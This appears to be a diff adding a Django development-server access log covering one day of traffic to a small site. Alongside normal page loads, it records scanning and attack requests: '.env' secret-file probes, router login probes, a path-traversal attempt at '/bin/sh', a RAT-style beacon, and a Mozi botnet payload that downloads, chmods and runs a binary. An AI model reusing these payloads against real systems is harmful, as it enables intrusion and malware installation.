+[26/Jul/2023 04:27:11] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 04:27:11,425] - Broken pipe from ('34.78.120.99', 47186)
+[26/Jul/2023 04:37:18] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 04:37:18,293] - Broken pipe from ('72.11.51.242', 33348)
+[26/Jul/2023 04:44:44] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 04:44:44] "GET /static/css/main.css HTTP/1.1" 304 0
+[26/Jul/2023 04:44:44] "GET /static/img/camion-1.jpeg HTTP/1.1" 304 0
+[26/Jul/2023 04:44:44] "GET /static/img/camion-2.jpg HTTP/1.1" 304 0
+[26/Jul/2023 04:44:44] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[26/Jul/2023 04:44:44] "GET /static/img/background.jpg HTTP/1.1" 304 0
+[26/Jul/2023 04:44:44] "GET /static/img/banner.jpg HTTP/1.1" 304 0
+[26/Jul/2023 04:47:12] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 04:47:12,837] - Broken pipe from ('64.62.197.30', 19009)
+[26/Jul/2023 04:49:00] "GET /favicon.ico HTTP/1.1" 404 179
+[26/Jul/2023 04:49:26] "GET /geoserver/web/ HTTP/1.1" 404 179
+[26/Jul/2023 04:51:50] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 04:51:53] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 04:51:54] "GET /static/img/image-tda.png HTTP/1.1" 200 69859
+[26/Jul/2023 04:51:55] "GET /robots.txt HTTP/1.1" 404 179
+[26/Jul/2023 05:00:17] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 05:00:17] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 05:10:58] "CONNECT www.cloudflare.com:443 HTTP/1.1" 400 143
+[26/Jul/2023 05:34:47] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 05:40:42] code 400, message Bad request version ('À\x14À')
+[26/Jul/2023 05:40:42] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 05:47:36] code 400, message Bad request version ('À\x14À')
+[26/Jul/2023 05:47:36] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 05:53:11] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 05:53:11] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 06:17:41] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 06:28:07] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 06:47:14] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 06:56:39] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 07:00:00] code 400, message Bad request syntax ("\x16\x03\x01\x01ü\x01\x00\x01ø\x03\x034|ú\x87=¯å³\x04Û¬héwõ}Ï\x93½K0$))´ýópIèW'\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À")
+[26/Jul/2023 07:00:00] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 07:00:33] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 07:04:16] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 07:04:16] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 07:10:44] code 400, message Bad request version ("x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==")
+[26/Jul/2023 07:10:44] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 -
+[26/Jul/2023 07:22:55] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+[26/Jul/2023 07:22:55] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 -
+[26/Jul/2023 07:36:32] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 07:36:32] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 07:48:56] code 400, message Bad request version ('À\x14À')
+[26/Jul/2023 07:48:56] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 08:42:15] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 08:42:16] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 08:55:05] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 08:55:05] "GET /static/img/image-tda.png HTTP/1.1" 200 69859
+[26/Jul/2023 08:55:06] "GET /robots.txt HTTP/1.1" 404 179
+[26/Jul/2023 09:00:58] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 09:01:14] "POST /HNAP1/ HTTP/1.1" 404 179
+[26/Jul/2023 09:16:25] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 09:23:54] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 09:23:54] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 09:29:18] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 09:29:19] "POST /HNAP1/ HTTP/1.1" 404 179
+[26/Jul/2023 09:29:19,520] - Broken pipe from ('143.244.50.173', 37086)
+[26/Jul/2023 09:34:15] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 09:34:15,800] - Broken pipe from ('34.79.162.186', 35044)
+[26/Jul/2023 09:46:42] code 400, message Bad request version ('ô')
+[26/Jul/2023 09:46:42] "H   tj¨#D+Êð§»lÅ×¶íJnÁùxu[lðE-jìÔxLÉrÉuà%Rtgfv]%ÌèÏ® µÀfÈDÅ	ô" 400 -
+[26/Jul/2023 09:48:13] code 400, message Bad request version ('À\x14À')
+[26/Jul/2023 09:48:13] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 09:57:15] "GET /app/.env HTTP/1.1" 404 179
+[26/Jul/2023 09:57:15] "POST /app HTTP/1.1" 404 179
+[26/Jul/2023 09:57:49] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 09:57:49] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 10:02:44] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 10:02:46] "POST /HNAP1/ HTTP/1.1" 404 179
+[26/Jul/2023 10:04:30] code 400, message Bad request version ('À\x13À')
+[26/Jul/2023 10:04:30] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 10:04:31] code 400, message Bad request version ('À\x13À')
+[26/Jul/2023 10:04:31] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 10:04:31] code 400, message Bad request version ('À\x13À')
+[26/Jul/2023 10:04:31] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 10:04:32] code 400, message Bad request version ('À\x13À')
+[26/Jul/2023 10:04:32] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 10:10:55] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 10:10:55] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 10:16:24] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 10:31:57] "GET /systembc/password.php HTTP/1.0" 400 143
+[26/Jul/2023 10:39:51] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 10:39:52] "GET /static/img/image-tda.png HTTP/1.1" 200 69859
+[26/Jul/2023 10:48:08,232] - Broken pipe from ('167.94.145.60', 42286)
+[26/Jul/2023 10:48:09] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 10:48:09,733] - Broken pipe from ('167.94.145.60', 48838)
+[26/Jul/2023 10:48:10] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 10:48:10] code 505, message Invalid HTTP version (2.0)
+[26/Jul/2023 10:48:10] "PRI * HTTP/2.0" 505 -
+[26/Jul/2023 10:48:10] "GET /static/img/image-tda.png HTTP/1.1" 200 69859
+[26/Jul/2023 10:48:10] "GET /favicon.ico HTTP/1.1" 404 179
+[26/Jul/2023 11:00:36] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 11:00:51,683] - Broken pipe from ('167.248.133.51', 58208)
+[26/Jul/2023 11:00:52] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 11:00:52,750] - Broken pipe from ('167.248.133.51', 54936)
+[26/Jul/2023 11:00:52] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 11:00:52] code 505, message Invalid HTTP version (2.0)
+[26/Jul/2023 11:00:52] "PRI * HTTP/2.0" 505 -
+[26/Jul/2023 11:00:52] "GET /static/img/image-tda.png HTTP/1.1" 200 69859
+[26/Jul/2023 11:00:52] "GET /favicon.ico HTTP/1.1" 404 179
+[26/Jul/2023 11:20:07] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 11:20:07] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 11:30:17] code 400, message Bad request version ('À\x14À')
+[26/Jul/2023 11:30:17] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 11:30:18] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Óþ&\x8btÍ`|Û\x10E7Ù\x9f\x8dCº·wÃ\xadAw\x97ÍX\x8f5\x82p'@\x00\x00\x1aÀ/À+À\x11À\x07À\x13À")
+[26/Jul/2023 11:30:18] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 11:37:11] "GET / HTTP/1.0" 400 143
+[26/Jul/2023 11:39:40] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 11:43:13] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 11:43:13] "GET /static/img/image-tda.png HTTP/1.1" 200 69859
+[26/Jul/2023 11:44:57] "GET /3000D00E0000FFFF3F0031313744373731343634304537353046007A7A7A7A7A7A7A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000008047A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000 HTTP/1.1" 400 143
+[26/Jul/2023 11:44:58] "GET /3000D00E0000FFFF3F0031313744373731343634304537353046007A7A7A7A7A7A7A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000008047A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000 HTTP/1.1" 400 143
+[26/Jul/2023 11:44:59] code 400, message Bad request version ('©\x8a;\x08@¤,ò\x102`')
+[26/Jul/2023 11:44:59] "Ô   À   8gf}I¦Þñ4÷qà°el8Hä³Ý\8Y	¸¶Ez^2èÅqfÿû\@¿6R@ü-ÞjB(R1wª $^£4=6¯Ôå×¦%QwÝg´ø¢('Þ_#ìÜ$¾]yi]ãGÔx`¾æDS8­V¥a}â.Õ¬®üûÂm&úû÷Á\|¯ü¶8=f<>Õ}F@³¹z}*ÿ~ÕÿÿNZPØ&n6Õ­©;@¤,ò2`" 400 -
+[26/Jul/2023 11:44:59,007] - Broken pipe from ('143.244.175.97', 36786)
+[26/Jul/2023 11:44:59] code 400, message Bad request syntax ('¿¿¯¯~\x00\x00\x00V\x10F)/kÞ\x19¡ßÏ\x86I³Ý\x94G')
+[26/Jul/2023 11:44:59] "¿¿¯¯~   VF)/kÞ¡ßÏI³ÝG" 400 -
+[26/Jul/2023 11:44:59] "POST / HTTP/1.1" 400 143
+[26/Jul/2023 11:44:59] code 400, message Bad request syntax ('\x17\x03\x01\x01\x04e\x00\x00\x00Ø\x00\x00\x007epYGsVmnUWyGup00jUT0goAAAAVirae')
+[26/Jul/2023 11:44:59] "e   Ø   7epYGsVmnUWyGup00jUT0goAAAAVirae" 400 -
+[26/Jul/2023 11:44:59] code 400, message Bad HTTP/0.9 request type ('\x17\x03\x01\x01\x04e\x00\x00\x00Ø\x00\x00\x005BE3E46C-1767-40AD-336BA00CEFB60\x00\x00\x00\x00B\x08Èc\x04ë\x99éIËH©{\x0f\x0fß\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00¨X7c\x14')
+[26/Jul/2023 11:44:59] "e   Ø   5BE3E46C-1767-40AD-336BA00CEFB60    BÈcëéIËH©{ß                                                        ¨X7c¹È33¸byÿ³¨·úØRâÈØßkòãýI" 400 -
+[26/Jul/2023 11:44:59] code 400, message Bad request version ('©\x8a;\x08@¤,ò\x102`')
+[26/Jul/2023 11:44:59] "Ô   À   8gf}I¦Þñ4÷qà°el8Hä³Ý\8Y	¸¶Ez^2èÅqfÿû\@¿6R@ü-ÞjB(R1wª $^£4=6¯Ôå×¦%QwÝg´ø¢('Þ_#ìÜ$¾]yi]ãGÔx`¾æDS8­V¥a}â.Õ¬®üûÂm&úû÷Á\|¯ü¶8=f<>Õ}F@³¹z}*ÿ~ÕÿÿNZPØ&n6Õ­©;@¤,ò2`" 400 -
+[26/Jul/2023 11:44:59,638] - Broken pipe from ('143.244.147.206', 46162)
+[26/Jul/2023 11:44:59] code 400, message Bad request syntax ('¿¿¯¯~\x00\x00\x00V\x10F)/kÞ\x19¡ßÏ\x86I³Ý\x94G')
+[26/Jul/2023 11:44:59] "¿¿¯¯~   VF)/kÞ¡ßÏI³ÝG" 400 -
+[26/Jul/2023 11:44:59] "POST / HTTP/1.1" 400 143
+[26/Jul/2023 11:44:59] code 400, message Bad request syntax ('\x17\x03\x01\x01\x04e\x00\x00\x00Ø\x00\x00\x007epYGsVmnUWyGup00jUT0goAAAAVirae')
+[26/Jul/2023 11:44:59] "e   Ø   7epYGsVmnUWyGup00jUT0goAAAAVirae" 400 -
+[26/Jul/2023 11:44:59] code 400, message Bad HTTP/0.9 request type ('\x17\x03\x01\x01\x04e\x00\x00\x00Ø\x00\x00\x005BE3E46C-1767-40AD-336BA00CEFB60\x00\x00\x00\x00B\x08Èc\x04ë\x99éIËH©{\x0f\x0fß\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00¨X7c\x14')
+[26/Jul/2023 11:44:59] "e   Ø   5BE3E46C-1767-40AD-336BA00CEFB60    BÈcëéIËH©{ß                                                        ¨X7c¹È33¸byÿ³¨·úØRâÈØßkòãýI" 400 -
+[26/Jul/2023 11:47:20] code 400, message Bad request version ('À\x14À')
+[26/Jul/2023 11:47:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 12:07:27] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 12:07:27] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 12:10:49] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 12:11:56] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 12:18:26] "GET /robots.txt HTTP/1.1" 404 179
+[26/Jul/2023 12:18:31] "GET /seguimiento HTTP/1.1" 200 5588
+[26/Jul/2023 12:26:44] "GET /console/ HTTP/1.1" 404 179
+[26/Jul/2023 12:57:08] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 12:57:09] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 12:58:34] "POST /boaform/admin/formLogin HTTP/1.1" 404 179
+[26/Jul/2023 13:07:10] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 13:32:19] "GET /_ignition/execute-solution HTTP/1.1" 404 179
+[26/Jul/2023 13:38:50] "CONNECT www.twitch.tv:443 HTTP/1.1" 400 143
+[26/Jul/2023 13:46:29] code 400, message Bad request version ('À\x14À')
+[26/Jul/2023 13:46:29] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 13:49:15] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 13:55:56] code 400, message Bad request version ('H-ÙYù´\x9bÜ³\x08\x98¤\x9eÕ\x99\x8eµ÷Í\x93\x89³¿5\x91\x9bRR?')
+[26/Jul/2023 13:55:56] "99ÌëUÀ!iÈ¥u2ÞºÕ °Ó|ctWð 8E"®Ð+hÂVÑr´D=B¦gÓrÇÉ3¼ÓqÃ×Ï©¸>ãYÕvlª.¼9±Éö;µ]lMÈ(F¿p48Ï¶û¤÷k·ßÒÒx}sÜ]QçRv *G_ÈjtÙ«(÷¯××äMw lÇ6(¢bÊù|O]ò" ø#£f	fÛQ6ÕzÓ¼Ú+wêç¤ç×2ÔAêÐÒ´5çÕµNØÌ¯ýL:K¸ 0í¸è´é H-ÙYù´Ü³¤Õµ÷Í³¿5RR?" 400 -
+[26/Jul/2023 13:55:56,875] - Broken pipe from ('159.65.219.198', 44052)
+[26/Jul/2023 13:57:23] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 13:59:25] code 400, message Bad HTTP/0.9 request type ('\x16£\x91´q13ü\x06÷\x1b\x828÷¿-û{\x07\x7f6R°¼a/_\x821\x1bã\x92\x8fW\x12\x1a\x83¹\x95')
+[26/Jul/2023 13:59:25] "£´q13ü÷8÷¿-û{6R°¼a/_1ãW¹ßJ" 400 -
+[26/Jul/2023 13:59:25,228] - Broken pipe from ('138.68.248.59', 47156)
+[26/Jul/2023 14:02:00] "POST /boaform/admin/formLogin HTTP/1.1" 404 179
+[26/Jul/2023 14:07:26] code 400, message Bad request syntax ('\x03UÐ2\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+[26/Jul/2023 14:07:26] "UÐ2                                                                                                                                                                                                                                                                " 400 -
+[26/Jul/2023 14:07:26,162] - Broken pipe from ('157.230.160.190', 41922)
+[26/Jul/2023 14:13:20] code 400, message Bad request version ('G?Ç)J\x08µ+^9\x16j')
+[26/Jul/2023 14:13:20] "á1u=	c{F)esFÖ.\ËX G?Ç)Jµ+^9j" 400 -
+[26/Jul/2023 14:13:20,872] - Broken pipe from ('165.232.94.100', 41316)
+[26/Jul/2023 14:13:40] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 14:19:21] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 14:19:22] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 14:25:45] code 400, message Bad HTTP/0.9 request type ('æT¡\x12)\x05')
+[26/Jul/2023 14:25:45] "æT¡)öí­Mõjá²öÂ#¯}³M°:·ùWêð½cÈZÉp%ÝÆ\ýºX7uãèüdl&òbDBr" 400 -
+[26/Jul/2023 14:25:45,335] - Broken pipe from ('104.248.208.136', 44752)
+[26/Jul/2023 14:33:53] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 14:39:58] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 404 179
+[26/Jul/2023 14:51:39] "CONNECT google.com:443 HTTP/1.1" 400 143
+[26/Jul/2023 15:04:15] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 15:14:29] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 15:25:05] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 15:32:50] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 15:34:40] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 15:34:40] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 15:50:24] code 400, message Bad request version ('À\x14À')
+[26/Jul/2023 15:50:24] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 15:51:27] "GET /actuator/gateway/routes HTTP/1.1" 404 179
+[26/Jul/2023 16:00:09] "POST /boaform/admin/formLogin HTTP/1.1" 404 179
+[26/Jul/2023 16:18:07] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 16:26:56] "GET /favicon.ico HTTP/1.1" 404 179
+[26/Jul/2023 16:34:50] "POST /boaform/admin/formLogin HTTP/1.1" 404 179
+[26/Jul/2023 16:55:06] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 16:55:07] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 16:59:18] "GET /geoserver HTTP/1.1" 404 179
+[26/Jul/2023 16:59:34] "GET /admin/.env HTTP/1.1" 302 0
+[26/Jul/2023 16:59:34] "POST /admin HTTP/1.1" 301 0
+[26/Jul/2023 17:08:31] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 17:08:31] "POST /HNAP1/ HTTP/1.1" 404 179
+[26/Jul/2023 17:13:22] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 17:13:24] "GET /static/img/image-tda.png HTTP/1.1" 200 69859
+[26/Jul/2023 17:17:34] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 17:36:26] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 17:36:26] "GET /robots.txt HTTP/1.1" 404 179
+[26/Jul/2023 17:36:26] "GET /sitemap.xml HTTP/1.1" 404 179
+[26/Jul/2023 17:36:28,091] - Broken pipe from ('193.37.255.114', 38078)
+[26/Jul/2023 17:36:29] "GET /.well-known/security.txt HTTP/1.1" 404 179
+[26/Jul/2023 17:36:29,510] - Broken pipe from ('193.37.255.114', 37972)
+[26/Jul/2023 17:36:30] "GET /static/img/image-tda.png HTTP/1.1" 200 69859
+[26/Jul/2023 17:36:35,517] - Broken pipe from ('193.37.255.114', 38230)
+[26/Jul/2023 17:37:10] code 400, message Bad request version ('\x00/\x00')
+[26/Jul/2023 17:37:10] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 17:37:10] "GET /gS0r HTTP/1.1" 404 179
+[26/Jul/2023 17:37:11] "GET /gMCf HTTP/1.1" 404 179
+[26/Jul/2023 17:46:06] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00')
+[26/Jul/2023 17:46:06] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 18:01:44] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 18:01:44] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 18:03:33] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 18:18:31] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 18:24:28] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 18:24:28] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 18:28:13] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 18:31:06] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 19:02:41] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 19:02:42] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 19:16:31] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 19:21:54] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 19:42:12] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 19:42:12] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 19:45:13] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 19:45:14] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 19:51:47] code 400, message Bad request version ('À\x14À')
+[26/Jul/2023 19:51:47] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 19:56:32] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 19:56:33] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 19:57:30] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 20:07:18] "GET / HTTP/1.0" 400 143
+[26/Jul/2023 20:19:24] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 20:19:25] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 20:56:42] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 21:17:44] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 21:24:56] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 21:27:58] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 21:33:14] "POST /boaform/admin/formLogin HTTP/1.1" 404 179
+[26/Jul/2023 21:37:30] code 400, message Bad request syntax ("Ø¡\x95Ç>\x99®³;õ\x1a}'^j8y\x81\x8c\x08D¨¼ü\x8dÿó\x16¡Òª\x89C+\x8f±nF)\x13óÀ\x15°Û&Ð\x99\x1bâ½N\x13÷C@hsF\x91\x14è\x00V")
+[26/Jul/2023 21:37:30] "Ø¡Ç>®³;õ}'^j8yD¨¼üÿó¡ÒªC+±nF)óÀ°Û&Ðâ½N÷C@hsFè V" 400 -
+[26/Jul/2023 21:37:30] code 400, message Bad request version ('9¢')
+[26/Jul/2023 21:37:30] "Z8#¹z] é¶y¥ÇìÜo¤%Üu¨0%Â\ÙTï[p&F´d*ÄEÑ¿8½»Ø2$l.àïu±çÆ»L¿ÎOó®äc³ÿæý?M` â´ë"Á»ÃÏ	9¢" 400 -
+[26/Jul/2023 21:39:22] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 21:39:22] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 21:45:04] code 400, message Bad request version ('Ý%d1\x17¦%nÅ')
+[26/Jul/2023 21:45:04] "ÉÑ¦®lM/	p#î*5#]ÇR:È/¸ÍZû¤fÒÎ³¡»ü Ý%d1¦%nÅ" 400 -
+[26/Jul/2023 21:45:13] code 400, message Bad HTTP/0.9 request type ('\x10')
+[26/Jul/2023 21:45:13] "   BBBBºÁ«DAAA" 400 -
+[26/Jul/2023 21:48:28] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 21:48:28] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 21:50:10] code 400, message Bad request version ('À\x14À')
+[26/Jul/2023 21:50:10] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 22:03:48] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 22:15:08] "GET /upl.php HTTP/1.1" 404 179
+[26/Jul/2023 22:15:08] code 400, message Bad request version ('À\x14À')
+[26/Jul/2023 22:15:08] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 22:15:08] "GET /geoip/ HTTP/1.1" 404 179
+[26/Jul/2023 22:20:59] code 400, message Bad request version ('\x94\x12')
+[26/Jul/2023 22:20:59] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 22:20:59] code 400, message Bad request version ('À\x13À')
+[26/Jul/2023 22:20:59] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 22:20:59] code 400, message Bad request version ('À\x13À')
+[26/Jul/2023 22:20:59] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 22:20:59] code 400, message Bad request syntax ("\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03'z\x88=°Púö\x05}\x8dw®º4ix4;¶")
+[26/Jul/2023 22:20:59] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 22:20:59] "GET /99vt HTTP/1.1" 404 179
+[26/Jul/2023 22:20:59] "GET /gate.php HTTP/1.1" 404 179
+[26/Jul/2023 22:29:52] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 22:29:52] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 23:04:11] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 23:21:57] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 23:22:40] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 23:22:40] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 23:50:21] code 400, message Bad request version ('À\x14À')
+[26/Jul/2023 23:50:21] You're accessing the development server over HTTPS, but it only supports HTTP.
